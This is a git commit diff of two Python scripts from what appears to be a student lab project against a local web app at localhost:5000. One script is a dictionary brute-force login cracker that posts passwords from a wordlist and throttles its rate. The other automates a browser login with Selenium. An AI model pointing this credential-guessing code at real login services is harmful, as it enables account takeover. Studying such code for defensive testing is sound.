acfb163b5c3e2371f4110446444ec48f07b98f7d
devulapallisai <ee20btech11013@iith.ac.in>
2022-04-06 19:03:55 +0530

    added

--- script/password.py
+++ script/password.py
@@ -1,29 +1,39 @@
 import requests
 import time
 import sys
+from termcolor import colored, cprint
 
 url = "http://localhost:5000/postpassword"
 username = "hello@gmail.com"
 error = "Error message"
 
 
-try:
-    def bruteCracking(username, url, error):
-        count = 0
-        for password in passwords:
-            password = password.strip()
-            count = count + 1
-            # print("Trying Password: " + str(count) + ' Time For => ' + password)
-            data_dict = {"username": username,
-                         "password": password}
-            response = requests.post(url, data_dict)
-            # print(response)
-            if(int(response.status_code) == 200):
-                print("Username: ---> " + username)
-                print("Password: ---> " + password)
-                exit()
-except:
-    print("Some Error Occurred Please Check Your Internet Connection !!")
+def bruteCracking(username, url, error):
+    count = 0
+    for password in passwords:
+        password = password.strip()
+        count = count + 1
+        # print("Trying Password: " + str(count) + ' Time For => ' + password)
+        if(count == 16000):
+            time.sleep(2)
+            count = 0
+        data_dict = {"username": username,
+                     "password": password}
+        response = requests.post(url, data_dict)
+        # print(response)
+        if(int(response.status_code) == 200):
+            text = "request to host: http://localhost:5000/" + \
+                " username: " + username + " password: " + password + \
+                " response status "+str(response.status_code)
+            print(colored(text, 'green'))
+            exit()
+        text = " request to host: http://localhost:5000/ " + \
+            " username: " + username + " password: " + password + \
+            " response status code is "+str(response.status_code)
+        print(colored(text, 'red'))
+# except:
+#     print("Some Error Occurred Please Check Your Internet Connection !!")
+
 
 with open("passwords.txt", "r") as passwords:
     bruteCracking(username, url, error)
--- script/script.py
+++ script/script.py
@@ -9,28 +9,27 @@ import time
 
 def launchBrowser():
     username = "hello@gmail.com"
-    # password = "correct"
-    for password in passwords:
-        options = Options()
+    password = "correct"
+    options = Options()
 
     # driver = webdriver.Chrome(service=Service(ChromeDriverManager().install())
-        driver = webdriver.Chrome(service=Service(
-            ChromeDriverManager().install()))
-        options.add_argument("start-maximized")
-        options.add_experimental_option('excludeSwitches', ['enable-logging'])
-        driver.get("http://localhost:5000")
-        time.sleep(2)
-        username_in_website = driver.find_element(
-            By.XPATH, value='//*[@id="form2Example1"]')
-        username_in_website.send_keys(username)
-        password_in_website = driver.find_element(
-            By.XPATH, value='//*[@id="form2Example2"]')
-        password_in_website.send_keys(password)
+    driver = webdriver.Chrome(service=Service(
+        ChromeDriverManager().install()))
+    options.add_argument("start-maximized")
+    options.add_experimental_option('excludeSwitches', ['enable-logging'])
+    driver.get("http://localhost:5000")
+    time.sleep(2)
+    username_in_website = driver.find_element(
+        By.XPATH, value='//*[@id="form2Example1"]')
+    username_in_website.send_keys(username)
+    password_in_website = driver.find_element(
+        By.XPATH, value='//*[@id="form2Example2"]')
+    password_in_website.send_keys(password)
 
-        submit = driver.find_element(
-            By.XPATH, value="/html/body/form/div/div[2]/button")
+    submit = driver.find_element(
+        By.XPATH, value="/html/body/form/div/div[2]/button")
 
-        submit.click()
+    submit.click()
     return driver
 
 
